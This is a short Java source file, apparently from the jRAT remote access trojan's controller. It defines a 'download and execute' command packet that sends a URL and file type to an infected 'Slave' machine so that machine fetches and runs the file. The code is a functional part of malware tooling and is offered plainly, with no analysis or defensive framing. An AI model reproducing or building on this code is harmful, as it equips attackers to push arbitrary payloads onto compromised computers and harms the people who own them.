package se.jrat.controller.packets.outgoing;

import java.io.DataOutputStream;
import java.io.File;

import se.jrat.controller.Slave;


public class Packet17DownloadExecute extends AbstractOutgoingPacket {

	private String url;
	private String filetype;
	private boolean fromLocal;

	public Packet17DownloadExecute(String url, String filetype) {
		this.url = url;
		this.filetype = filetype;
	}
	
	public Packet17DownloadExecute(String url, String filetype, File local) {
		this.url = url;
		this.filetype = filetype;
		this.fromLocal = true;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		slave.writeLine(url);
		slave.writeLine(filetype);
		dos.writeBoolean(fromLocal);
	}

	@Override
	public short getPacketId() {
		return 17;
	}

}
